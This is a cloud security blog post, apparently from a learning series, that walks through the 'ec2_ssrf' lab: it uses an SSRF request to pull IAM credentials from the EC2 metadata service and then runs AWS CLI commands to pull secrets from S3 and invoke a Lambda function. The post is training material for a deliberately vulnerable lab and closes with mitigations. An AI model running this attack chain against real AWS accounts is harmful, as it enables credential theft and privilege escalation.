---
title: '100 Days of Cloud Security - Day 25: Attack — `ec2_ssrf`'
date: '2025-12-04'
author: 'Venkata Pathuri'
excerpt: 'Day 25 of my cloud security journey - Attack — `ec2_ssrf`'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 25: Attack — `ec2_ssrf`

## Overview
Welcome to Day 25 of our cloud security journey! Today, we delve into the world of Server-Side Request Forgery (SSRF), focusing on the `ec2_ssrf` scenario. This attack vector highlights the importance of securing AWS EC2 instances and their metadata services. Building upon our previous lessons, we will explore how an SSRF vulnerability can be exploited to gain unauthorized access to sensitive information, paving the way for privilege escalation within the AWS environment.

## Learning Objectives
By the end of today’s lesson, you’ll master the following skills:
- Recognize and exploit SSRF vulnerabilities within AWS environments.
- Understand the implications of exposing EC2 instance metadata and how to mitigate such risks.
- Utilize temporary AWS credentials retrieved through SSRF to access other AWS services.
- Invoke a Lambda function using compromised credentials, demonstrating the real-world impact of such attacks.

## Deep Dive
### Understanding SSRF
Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to send crafted requests from the server-side to internal resources, often bypassing firewalls and other security mechanisms. In the context of AWS, this can lead to the unauthorized retrieval of sensitive information from the EC2 instance metadata service (IMDS).

### The EC2 Instance Metadata Service (IMDS)
IMDS is a critical service that allows EC2 instances to retrieve instance-specific information, such as IAM role credentials. By default, IMDS is accessible at the special IP address `169.254.169.254`. Proper configuration is vital to ensure that this service is not exposed to unauthorized access.

### Exploiting SSRF to Access IMDS
In our practical scenario, we begin by identifying an SSRF vulnerability in a web application hosted on our EC2 instance. The application reflects user-provided URLs, allowing us to send a request to the IMDS. Here’s how we do it:

1. **Initial Request to the EC2 Instance**: We send a request to the public IP of our EC2 instance.
   
2. **Testing for SSRF**: By appending a URL parameter, we verify the SSRF vulnerability. For example:
   ```
   http://54.80.91.156/?url=www.google.com
   ```
   If the application returns the content from Google, we confirm the SSRF vulnerability.

3. **Accessing IMDS**: With the SSRF confirmed, we can send a request to retrieve sensitive metadata:
   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid9x9w9vs3i5
   ```

### Extracting Credentials
Upon successfully querying IMDS, we can retrieve temporary IAM role credentials for the EC2 instance, which include an Access Key ID, Secret Access Key, and Session Token. This access allows us to perform actions on behalf of the EC2 instance.

### Accessing Additional AWS Services
With the extracted IAM role credentials, we can configure a new AWS CLI profile and access other AWS services, such as S3. For example, we can download sensitive files stored in an S3 bucket, ultimately leading to privilege escalation.

### Invoking the Lambda Function
Finally, using the credentials obtained from the S3 bucket, we can invoke an AWS Lambda function, demonstrating the successful exploitation of the SSRF vulnerability.

## Hands-On Practice
Here’s a step-by-step guide to exploit the `ec2_ssrf` scenario:

### Step 1: Verify Initial AWS Identity
Run the following command:
```bash
aws sts get-caller-identity --profile cg
```
**Expected Outcome**: Verify your identity and account details.

### Step 2: Enumerate Lambda Functions
```bash
aws lambda list-functions --profile cg
```
**Expected Outcome**: Identify the Lambda functions available to your user.

### Step 3: Describe EC2 Instances
```bash
aws ec2 describe-instances --profile ec2
```
**Expected Outcome**: Confirm the EC2 instance's metadata settings and public IP.

### Step 4: Exploit SSRF
Send a crafted request:
```bash
http://54.80.91.156/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid9x9w9vs3i5
```
**Expected Outcome**: Retrieve EC2 role credentials.

### Step 5: Access S3 Bucket
Using the extracted credentials:
```bash
aws s3 cp s3://cg-secret-s3-bucket-cgid9x9w9vs3i5/aws/credentials output.txt --profile ec2-role --region us-east-1
```
**Expected Outcome**: Download the credentials file from S3.

### Step 6: Invoke the Lambda Function
Using the new service role:
```bash
aws lambda invoke --function-name "cg-lambda-cgid9x9w9vs3i5" output1.txt --profile cg-s3
```
**Expected Outcome**: Successfully invoke the Lambda function and receive confirmation.

### Common Pitfalls
- **Incorrect Permissions**: Ensure your IAM role has sufficient permissions to access the required resources.
- **Misconfigured Security Groups**: Verify that your EC2 instance is properly configured to allow inbound traffic.

## Key Takeaways
Today’s lesson highlights the criticality of securing AWS services against SSRF vulnerabilities. We demonstrated how an attacker could exploit such a weakness to retrieve sensitive data from the EC2 instance metadata service and leverage that access to escalate privileges within the AWS environment. Understanding these risks and implementing robust security measures are essential for protecting cloud resources.

## Real-World Applications
In production environments, the lessons learned today are invaluable. Organizations must regularly audit their EC2 instance setups, ensuring that metadata services are properly secured, and sensitive data is not exposed to potential SSRF attacks. Employing best practices such as using IMDSv2, restricting IAM role permissions, and performing regular security assessments can help mitigate these risks significantly.

---
**Journey Progress:** 25/100 Days Complete 🚀